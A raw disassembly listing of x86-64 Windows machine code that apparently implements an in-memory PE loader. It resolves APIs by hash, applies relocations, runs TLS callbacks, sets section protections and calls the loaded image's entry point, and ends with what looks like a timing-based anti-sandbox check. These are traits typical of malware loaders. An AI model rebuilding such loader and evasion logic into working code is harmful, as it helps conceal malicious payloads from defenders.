   1400061df:	66 c1 e9 0c          	shr    $0xc,%cx
   1400061e3:	66 83 f9 0a          	cmp    $0xa,%cx
   1400061e7:	75 10                	jne    0x1400061f9
   1400061e9:	41 8b 08             	mov    (%r8),%ecx
   1400061ec:	0f b7 d0             	movzwl %ax,%edx
   1400061ef:	48 8d 04 0f          	lea    (%rdi,%rcx,1),%rax
   1400061f3:	4c 01 14 02          	add    %r10,(%rdx,%rax,1)
   1400061f7:	eb 36                	jmp    0x14000622f
   1400061f9:	66 85 c9             	test   %cx,%cx
   1400061fc:	74 36                	je     0x140006234
   1400061fe:	66 83 f9 01          	cmp    $0x1,%cx
   140006202:	75 16                	jne    0x14000621a
   140006204:	41 8b 08             	mov    (%r8),%ecx
   140006207:	0f b7 d0             	movzwl %ax,%edx
   14000620a:	48 03 cf             	add    %rdi,%rcx
   14000620d:	49 8b c2             	mov    %r10,%rax
   140006210:	48 c1 e8 10          	shr    $0x10,%rax
   140006214:	66 01 04 11          	add    %ax,(%rcx,%rdx,1)
   140006218:	eb 15                	jmp    0x14000622f
   14000621a:	66 83 f9 02          	cmp    $0x2,%cx
   14000621e:	75 14                	jne    0x140006234
   140006220:	41 8b 08             	mov    (%r8),%ecx
   140006223:	0f b7 d0             	movzwl %ax,%edx
   140006226:	48 8d 04 0f          	lea    (%rdi,%rcx,1),%rax
   14000622a:	66 44 01 14 02       	add    %r10w,(%rdx,%rax,1)
   14000622f:	ba ff 0f 00 00       	mov    $0xfff,%edx
   140006234:	49 83 c1 02          	add    $0x2,%r9
   140006238:	49 83 eb 01          	sub    $0x1,%r11
   14000623c:	75 92                	jne    0x1400061d0
   14000623e:	41 8b 40 04          	mov    0x4(%r8),%eax
   140006242:	4c 03 c0             	add    %rax,%r8
   140006245:	4c 3b c3             	cmp    %rbx,%r8
   140006248:	0f 82 62 ff ff ff    	jb     0x1400061b0
   14000624e:	e8 6d f8 ff ff       	call   0x140005ac0
   140006253:	ba 60 ce 86 df       	mov    $0xdf86ce60,%edx
   140006258:	48 8b c8             	mov    %rax,%rcx
   14000625b:	48 8b d8             	mov    %rax,%rbx
   14000625e:	e8 1d f9 ff ff       	call   0x140005b80
   140006263:	ba 3c 17 3a e1       	mov    $0xe13a173c,%edx
   140006268:	48 8b cb             	mov    %rbx,%rcx
   14000626b:	4c 8b e0             	mov    %rax,%r12
   14000626e:	e8 0d f9 ff ff       	call   0x140005b80
   140006273:	41 83 bd 94 00 00 00 	cmpl   $0x0,0x94(%r13)
   14000627a:	00 
   14000627b:	4c 8b f8             	mov    %rax,%r15
   14000627e:	0f 84 91 00 00 00    	je     0x140006315
   140006284:	41 8b 8d 90 00 00 00 	mov    0x90(%r13),%ecx
   14000628b:	85 c9                	test   %ecx,%ecx
   14000628d:	0f 84 82 00 00 00    	je     0x140006315
   140006293:	83 7c 0f 0c 00       	cmpl   $0x0,0xc(%rdi,%rcx,1)
   140006298:	4c 8d 34 0f          	lea    (%rdi,%rcx,1),%r14
   14000629c:	74 72                	je     0x140006310
   14000629e:	66 90                	xchg   %ax,%ax
   1400062a0:	41 8b 4e 0c          	mov    0xc(%r14),%ecx
   1400062a4:	48 03 cf             	add    %rdi,%rcx
   1400062a7:	41 ff d4             	call   *%r12
   1400062aa:	48 8b e8             	mov    %rax,%rbp
   1400062ad:	48 85 c0             	test   %rax,%rax
   1400062b0:	74 53                	je     0x140006305
   1400062b2:	41 8b 06             	mov    (%r14),%eax
   1400062b5:	41 8b 5e 10          	mov    0x10(%r14),%ebx
   1400062b9:	48 03 df             	add    %rdi,%rbx
   1400062bc:	48 8d 34 07          	lea    (%rdi,%rax,1),%rsi
   1400062c0:	85 c0                	test   %eax,%eax
   1400062c2:	75 03                	jne    0x1400062c7
   1400062c4:	48 8b f3             	mov    %rbx,%rsi
   1400062c7:	48 8b 06             	mov    (%rsi),%rax
   1400062ca:	48 85 c0             	test   %rax,%rax
   1400062cd:	74 36                	je     0x140006305
   1400062cf:	90                   	nop
   1400062d0:	48 8b cd             	mov    %rbp,%rcx
   1400062d3:	48 85 c0             	test   %rax,%rax
   1400062d6:	79 05                	jns    0x1400062dd
   1400062d8:	0f b7 d0             	movzwl %ax,%edx
   1400062db:	eb 07                	jmp    0x1400062e4
   1400062dd:	48 8d 50 02          	lea    0x2(%rax),%rdx
   1400062e1:	48 03 d7             	add    %rdi,%rdx
   1400062e4:	41 ff d7             	call   *%r15
   1400062e7:	48 85 c0             	test   %rax,%rax
   1400062ea:	74 08                	je     0x1400062f4
   1400062ec:	48 85 db             	test   %rbx,%rbx
   1400062ef:	74 03                	je     0x1400062f4
   1400062f1:	48 89 03             	mov    %rax,(%rbx)
   1400062f4:	48 8b 46 08          	mov    0x8(%rsi),%rax
   1400062f8:	48 83 c6 08          	add    $0x8,%rsi
   1400062fc:	48 83 c3 08          	add    $0x8,%rbx
   140006300:	48 85 c0             	test   %rax,%rax
   140006303:	75 cb                	jne    0x1400062d0
   140006305:	49 83 c6 14          	add    $0x14,%r14
   140006309:	41 83 7e 0c 00       	cmpl   $0x0,0xc(%r14)
   14000630e:	75 90                	jne    0x1400062a0
   140006310:	4c 8b 74 24 70       	mov    0x70(%rsp),%r14
   140006315:	41 83 bd d4 00 00 00 	cmpl   $0x0,0xd4(%r13)
   14000631c:	00 
   14000631d:	74 3b                	je     0x14000635a
   14000631f:	41 8b 85 d0 00 00 00 	mov    0xd0(%r13),%eax
   140006326:	85 c0                	test   %eax,%eax
   140006328:	74 30                	je     0x14000635a
   14000632a:	48 8b 5c 38 18       	mov    0x18(%rax,%rdi,1),%rbx
   14000632f:	48 85 db             	test   %rbx,%rbx
   140006332:	74 26                	je     0x14000635a
   140006334:	48 8b 03             	mov    (%rbx),%rax
   140006337:	48 85 c0             	test   %rax,%rax
   14000633a:	74 1e                	je     0x14000635a
   14000633c:	0f 1f 40 00          	nopl   0x0(%rax)
   140006340:	45 33 c0             	xor    %r8d,%r8d
   140006343:	ba 01 00 00 00       	mov    $0x1,%edx
   140006348:	48 8b cf             	mov    %rdi,%rcx
   14000634b:	ff d0                	call   *%rax
   14000634d:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140006351:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   140006355:	48 85 c0             	test   %rax,%rax
   140006358:	75 e6                	jne    0x140006340
   14000635a:	e8 c1 f7 ff ff       	call   0x140005b20
   14000635f:	ba 71 09 b5 3a       	mov    $0x3ab50971,%edx
   140006364:	48 8b c8             	mov    %rax,%rcx
   140006367:	e8 14 f8 ff ff       	call   0x140005b80
   14000636c:	41 8b 8d a4 00 00 00 	mov    0xa4(%r13),%ecx
   140006373:	4c 8b c8             	mov    %rax,%r9
   140006376:	85 c9                	test   %ecx,%ecx
   140006378:	74 2b                	je     0x1400063a5
   14000637a:	45 8b 85 a0 00 00 00 	mov    0xa0(%r13),%r8d
   140006381:	45 85 c0             	test   %r8d,%r8d
   140006384:	74 1f                	je     0x1400063a5
   140006386:	48 b8 ab aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaab,%rax
   14000638d:	aa aa aa 
   140006390:	48 f7 e1             	mul    %rcx
   140006393:	48 c1 ea 03          	shr    $0x3,%rdx
   140006397:	85 d2                	test   %edx,%edx
   140006399:	74 0a                	je     0x1400063a5
   14000639b:	4a 8d 0c 07          	lea    (%rdi,%r8,1),%rcx
   14000639f:	4c 8b c7             	mov    %rdi,%r8
   1400063a2:	41 ff d1             	call   *%r9
   1400063a5:	e8 16 f7 ff ff       	call   0x140005ac0
   1400063aa:	ba 59 16 4a a5       	mov    $0xa54a1659,%edx
   1400063af:	48 8b c8             	mov    %rax,%rcx
   1400063b2:	e8 c9 f7 ff ff       	call   0x140005b80
   1400063b7:	41 0f b7 5d 14       	movzwl 0x14(%r13),%ebx
   1400063bc:	45 33 ff             	xor    %r15d,%r15d
   1400063bf:	48 83 c3 20          	add    $0x20,%rbx
   1400063c3:	48 8b e8             	mov    %rax,%rbp
   1400063c6:	41 0f b7 f7          	movzwl %r15w,%esi
   1400063ca:	66 45 3b 7d 06       	cmp    0x6(%r13),%r15w
   1400063cf:	0f 83 98 00 00 00    	jae    0x14000646d
   1400063d5:	49 03 dd             	add    %r13,%rbx
   1400063d8:	41 bc 20 00 00 00    	mov    $0x20,%r12d
   1400063de:	66 90                	xchg   %ax,%ax
   1400063e0:	44 8b 03             	mov    (%rbx),%r8d
   1400063e3:	44 8b 4b 04          	mov    0x4(%rbx),%r9d
   1400063e7:	45 85 c0             	test   %r8d,%r8d
   1400063ea:	74 6f                	je     0x14000645b
   1400063ec:	41 8b 55 50          	mov    0x50(%r13),%edx
   1400063f0:	43 8d 04 08          	lea    (%r8,%r9,1),%eax
   1400063f4:	41 2b d1             	sub    %r9d,%edx
   1400063f7:	41 3b 45 50          	cmp    0x50(%r13),%eax
   1400063fb:	41 0f 46 d0          	cmovbe %r8d,%edx
   1400063ff:	81 c2 ff 0f 00 00    	add    $0xfff,%edx
   140006405:	81 e2 00 f0 ff ff    	and    $0xfffff000,%edx
   14000640b:	74 4e                	je     0x14000645b
   14000640d:	8b 43 1c             	mov    0x1c(%rbx),%eax
   140006410:	8b c8                	mov    %eax,%ecx
   140006412:	81 e1 00 00 00 40    	and    $0x40000000,%ecx
   140006418:	0f ba e0 1d          	bt     $0x1d,%eax
   14000641c:	73 1a                	jae    0x140006438
   14000641e:	85 c0                	test   %eax,%eax
   140006420:	79 08                	jns    0x14000642a
   140006422:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140006428:	eb 26                	jmp    0x140006450
   14000642a:	85 c9                	test   %ecx,%ecx
   14000642c:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140006432:	45 0f 45 c4          	cmovne %r12d,%r8d
   140006436:	eb 18                	jmp    0x140006450
   140006438:	85 c0                	test   %eax,%eax
   14000643a:	79 08                	jns    0x140006444
   14000643c:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140006442:	eb 0c                	jmp    0x140006450
   140006444:	85 c9                	test   %ecx,%ecx
   140006446:	45 8b c7             	mov    %r15d,%r8d
   140006449:	41 0f 95 c0          	setne  %r8b
   14000644d:	41 ff c0             	inc    %r8d
   140006450:	4a 8d 0c 0f          	lea    (%rdi,%r9,1),%rcx
   140006454:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140006459:	ff d5                	call   *%rbp
   14000645b:	66 ff c6             	inc    %si
   14000645e:	48 83 c3 28          	add    $0x28,%rbx
   140006462:	66 41 3b 75 06       	cmp    0x6(%r13),%si
   140006467:	0f 82 73 ff ff ff    	jb     0x1400063e0
   14000646d:	41 8b 45 28          	mov    0x28(%r13),%eax
   140006471:	85 c0                	test   %eax,%eax
   140006473:	74 26                	je     0x14000649b
   140006475:	8b c8                	mov    %eax,%ecx
   140006477:	b8 00 20 00 00       	mov    $0x2000,%eax
   14000647c:	66 41 85 45 16       	test   %ax,0x16(%r13)
   140006481:	74 13                	je     0x140006496
   140006483:	48 8d 04 39          	lea    (%rcx,%rdi,1),%rax
   140006487:	45 33 c0             	xor    %r8d,%r8d
   14000648a:	48 8b cf             	mov    %rdi,%rcx
   14000648d:	ba 01 00 00 00       	mov    $0x1,%edx
   140006492:	ff d0                	call   *%rax
   140006494:	eb 05                	jmp    0x14000649b
   140006496:	48 03 cf             	add    %rdi,%rcx
   140006499:	ff d1                	call   *%rcx
   14000649b:	33 d2                	xor    %edx,%edx
   14000649d:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   1400064a3:	48 8b cf             	mov    %rdi,%rcx
   1400064a6:	41 ff d6             	call   *%r14
   1400064a9:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   1400064ae:	b8 01 00 00 00       	mov    $0x1,%eax
   1400064b3:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   1400064b7:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   1400064bb:	49 8b 73 48          	mov    0x48(%r11),%rsi
   1400064bf:	49 8b e3             	mov    %r11,%rsp
   1400064c2:	41 5f                	pop    %r15
   1400064c4:	41 5e                	pop    %r14
   1400064c6:	41 5d                	pop    %r13
   1400064c8:	41 5c                	pop    %r12
   1400064ca:	5f                   	pop    %rdi
   1400064cb:	c3                   	ret
   1400064cc:	cc                   	int3
   1400064cd:	cc                   	int3
   1400064ce:	cc                   	int3
   1400064cf:	cc                   	int3
   1400064d0:	40 53                	rex push %rbx
   1400064d2:	56                   	push   %rsi
   1400064d3:	48 83 ec 28          	sub    $0x28,%rsp
   1400064d7:	4c 8b 41 08          	mov    0x8(%rcx),%r8
   1400064db:	48 8b f1             	mov    %rcx,%rsi
   1400064de:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   1400064e3:	33 ed                	xor    %ebp,%ebp
   1400064e5:	4c 89 64 24 50       	mov    %r12,0x50(%rsp)
   1400064ea:	4c 8b e2             	mov    %rdx,%r12
   1400064ed:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   1400064f2:	45 0f b7 70 14       	movzwl 0x14(%r8),%r14d
   1400064f7:	49 83 c6 28          	add    $0x28,%r14
   1400064fb:	66 41 3b 68 06       	cmp    0x6(%r8),%bp
   140006500:	0f 83 a4 00 00 00    	jae    0x1400065aa
   140006506:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   14000650b:	4d 03 f0             	add    %r8,%r14
   14000650e:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140006513:	0f 1f 40 00          	nopl   0x0(%rax)
   140006517:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000651e:	00 00 
   140006520:	41 8b 46 f8          	mov    -0x8(%r14),%eax
   140006524:	85 c0                	test   %eax,%eax
   140006526:	41 8b 3e             	mov    (%r14),%edi
   140006529:	45 8b 7e fc          	mov    -0x4(%r14),%r15d
   14000652d:	8b d7                	mov    %edi,%edx
   14000652f:	41 8b 58 50          	mov    0x50(%r8),%ebx
   140006533:	0f 45 d0             	cmovne %eax,%edx
   140006536:	45 8b 4e 04          	mov    0x4(%r14),%r9d
   14000653a:	41 2b df             	sub    %r15d,%ebx
   14000653d:	42 8d 04 3a          	lea    (%rdx,%r15,1),%eax
   140006541:	41 3b 40 50          	cmp    0x50(%r8),%eax
   140006545:	0f 46 da             	cmovbe %edx,%ebx
   140006548:	85 ff                	test   %edi,%edi
   14000654a:	74 2e                	je     0x14000657a
   14000654c:	45 85 c9             	test   %r9d,%r9d
   14000654f:	74 29                	je     0x14000657a
   140006551:	3b fb                	cmp    %ebx,%edi
   140006553:	8b c3                	mov    %ebx,%eax
   140006555:	0f 42 c7             	cmovb  %edi,%eax
   140006558:	85 c0                	test   %eax,%eax
   14000655a:	74 12                	je     0x14000656e
   14000655c:	41 8b cf             	mov    %r15d,%ecx
   14000655f:	44 8b c0             	mov    %eax,%r8d
   140006562:	48 03 0e             	add    (%rsi),%rcx
   140006565:	4b 8d 14 0c          	lea    (%r12,%r9,1),%rdx
   140006569:	e8 02 f5 ff ff       	call   0x140005a70
   14000656e:	3b df                	cmp    %edi,%ebx
   140006570:	76 1c                	jbe    0x14000658e
   140006572:	2b df                	sub    %edi,%ebx
   140006574:	49 8d 0c 3f          	lea    (%r15,%rdi,1),%rcx
   140006578:	eb 07                	jmp    0x140006581
   14000657a:	85 db                	test   %ebx,%ebx
   14000657c:	74 10                	je     0x14000658e
   14000657e:	49 8b cf             	mov    %r15,%rcx
   140006581:	48 03 0e             	add    (%rsi),%rcx
   140006584:	33 d2                	xor    %edx,%edx
   140006586:	44 8b c3             	mov    %ebx,%r8d
   140006589:	e8 12 f5 ff ff       	call   0x140005aa0
   14000658e:	4c 8b 46 08          	mov    0x8(%rsi),%r8
   140006592:	66 ff c5             	inc    %bp
   140006595:	49 83 c6 28          	add    $0x28,%r14
   140006599:	66 41 3b 68 06       	cmp    0x6(%r8),%bp
   14000659e:	72 80                	jb     0x140006520
   1400065a0:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   1400065a5:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400065aa:	41 0f b7 48 06       	movzwl 0x6(%r8),%ecx
   1400065af:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   1400065b4:	4c 8b 64 24 50       	mov    0x50(%rsp),%r12
   1400065b9:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   1400065be:	66 85 c9             	test   %cx,%cx
   1400065c1:	74 62                	je     0x140006625
   1400065c3:	41 0f b7 50 14       	movzwl 0x14(%r8),%edx
   1400065c8:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   1400065cc:	48 83 c2 18          	add    $0x18,%rdx
   1400065d0:	49 03 d0             	add    %r8,%rdx
   1400065d3:	8b 42 0c             	mov    0xc(%rdx),%eax
   1400065d6:	48 8d 1c ca          	lea    (%rdx,%rcx,8),%rbx
   1400065da:	41 8b 48 54          	mov    0x54(%r8),%ecx
   1400065de:	3b c1                	cmp    %ecx,%eax
   1400065e0:	76 0f                	jbe    0x1400065f1
   1400065e2:	2b c1                	sub    %ecx,%eax
   1400065e4:	33 d2                	xor    %edx,%edx
   1400065e6:	48 03 0e             	add    (%rsi),%rcx
   1400065e9:	44 8b c0             	mov    %eax,%r8d
   1400065ec:	e8 af f4 ff ff       	call   0x140005aa0
   1400065f1:	8b 53 e4             	mov    -0x1c(%rbx),%edx
   1400065f4:	48 8b 46 08          	mov    0x8(%rsi),%rax
   1400065f8:	81 c2 ff 0f 00 00    	add    $0xfff,%edx
   1400065fe:	03 53 e0             	add    -0x20(%rbx),%edx
   140006601:	81 e2 00 f0 ff ff    	and    $0xfffff000,%edx
   140006607:	44 8b 40 50          	mov    0x50(%rax),%r8d
   14000660b:	41 3b d0             	cmp    %r8d,%edx
   14000660e:	73 15                	jae    0x140006625
   140006610:	8b ca                	mov    %edx,%ecx
   140006612:	44 2b c2             	sub    %edx,%r8d
   140006615:	48 03 0e             	add    (%rsi),%rcx
   140006618:	33 d2                	xor    %edx,%edx
   14000661a:	48 83 c4 28          	add    $0x28,%rsp
   14000661e:	5e                   	pop    %rsi
   14000661f:	5b                   	pop    %rbx
   140006620:	e9 7b f4 ff ff       	jmp    0x140005aa0
   140006625:	48 83 c4 28          	add    $0x28,%rsp
   140006629:	5e                   	pop    %rsi
   14000662a:	5b                   	pop    %rbx
   14000662b:	c3                   	ret
   14000662c:	cc                   	int3
   14000662d:	cc                   	int3
   14000662e:	cc                   	int3
   14000662f:	cc                   	int3
   140006630:	40 56                	rex push %rsi
   140006632:	48 83 ec 20          	sub    $0x20,%rsp
   140006636:	e8 85 f4 ff ff       	call   0x140005ac0
   14000663b:	48 85 c0             	test   %rax,%rax
   14000663e:	74 7f                	je     0x1400066bf
   140006640:	ba 8e 4f 10 79       	mov    $0x79104f8e,%edx
   140006645:	48 8b c8             	mov    %rax,%rcx
   140006648:	e8 33 f5 ff ff       	call   0x140005b80
   14000664d:	48 8b f0             	mov    %rax,%rsi
   140006650:	48 85 c0             	test   %rax,%rax
   140006653:	74 6a                	je     0x1400066bf
   140006655:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000665a:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   14000665f:	ff d6                	call   *%rsi
   140006661:	8b d8                	mov    %eax,%ebx
   140006663:	bf e8 03 00 00       	mov    $0x3e8,%edi
   140006668:	ff d6                	call   *%rsi
   14000666a:	8b d0                	mov    %eax,%edx
   14000666c:	3b c3                	cmp    %ebx,%eax
   14000666e:	72 0a                	jb     0x14000667a
   140006670:	8b c8                	mov    %eax,%ecx
   140006672:	2b cb                	sub    %ebx,%ecx
   140006674:	3b cf                	cmp    %edi,%ecx
   140006676:	72 f0                	jb     0x140006668
   140006678:	eb 02                	jmp    0x14000667c
   14000667a:	8b da                	mov    %edx,%ebx
   14000667c:	8b ca                	mov    %edx,%ecx
   14000667e:	2b cb                	sub    %ebx,%ecx
   140006680:	3b d3                	cmp    %ebx,%edx
   140006682:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006687:	8d 41 ff             	lea    -0x1(%rcx),%eax
   14000668a:	0f 42 c8             	cmovb  %eax,%ecx
   14000668d:	3b cf                	cmp    %edi,%ecx
   14000668f:	76 19                	jbe    0x1400066aa
   140006691:	8d b9 18 fc ff ff    	lea    -0x3e8(%rcx),%edi
   140006697:	33 c0                	xor    %eax,%eax
   140006699:	83 ff 32             	cmp    $0x32,%edi
   14000669c:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   1400066a1:	0f 97 c0             	seta   %al
   1400066a4:	48 83 c4 20          	add    $0x20,%rsp
   1400066a8:	5e                   	pop    %rsi
   1400066a9:	c3                   	ret
   1400066aa:	2b f9                	sub    %ecx,%edi
   1400066ac:	33 c0                	xor    %eax,%eax
   1400066ae:	83 ff 32             	cmp    $0x32,%edi
   1400066b1:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   1400066b6:	0f 97 c0             	seta   %al
   1400066b9:	48 83 c4 20          	add    $0x20,%rsp
   1400066bd:	5e                   	pop    %rsi
   1400066be:	c3                   	ret
   1400066bf:	33 c0                	xor    %eax,%eax
   1400066c1:	48 83 c4 20          	add    $0x20,%rsp
   1400066c5:	5e                   	pop    %rsi
   1400066c6:	c3                   	ret
